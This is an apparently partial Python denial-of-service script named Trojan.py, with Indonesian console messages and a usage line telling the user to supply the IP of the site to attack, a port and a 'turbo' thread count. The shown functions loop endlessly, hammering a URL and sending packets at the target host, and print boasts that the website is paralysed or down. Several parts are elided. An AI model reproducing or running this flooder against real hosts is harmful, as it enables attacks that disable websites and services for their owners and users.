...
def bot_hammering(url):
	try:
		while True:
			...
			print("\033[94mvirus Trojan...\033[0m")
			time.sleep(.1)
	except:
		time.sleep(.1)
	...
	try:
		while True:
			...
			if s.sendto( packet, (host, int(port)) ):
				s.shutdown(1)
				print ("\033[92m",time.ctime(time.time()),"\033[0m \033[94m <--mengirim virus Trojan--> \033[0m")
			else:
				s.shutdown(1)
				print("\033[91mshut<-> web site sudah lumpuh\033[0m")
			time.sleep(.1)
	except socket.error as e:
		print("\033[91mkoneksi terputus kemungkinan website down anjir\033[0m")
...
def usage():
  ...
  Contoh: python3 Trojan.py -s (ip Yang Mau Lu Serang) -p (isi aja 80) -t (turbo 135) 
